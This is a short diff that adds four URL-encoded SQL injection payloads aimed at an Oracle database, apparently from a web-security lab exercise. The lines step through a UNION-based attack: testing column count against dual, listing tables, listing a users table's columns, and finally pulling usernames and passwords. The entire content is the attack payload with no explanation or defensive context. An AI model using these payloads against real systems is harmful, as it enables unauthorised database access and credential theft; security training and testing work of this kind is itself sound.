@@ -1,0 +1,4 @@
+'+UNION+SELECT+'abc','def'+FROM+dual--
+'+UNION+SELECT+table_name,NULL+FROM+all_tables--
+'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_LDAAVO'--
+'+UNION+SELECT+USERNAME_WHFGVT,+PASSWORD_BNDNVP+FROM+USERS_LDAAVO--
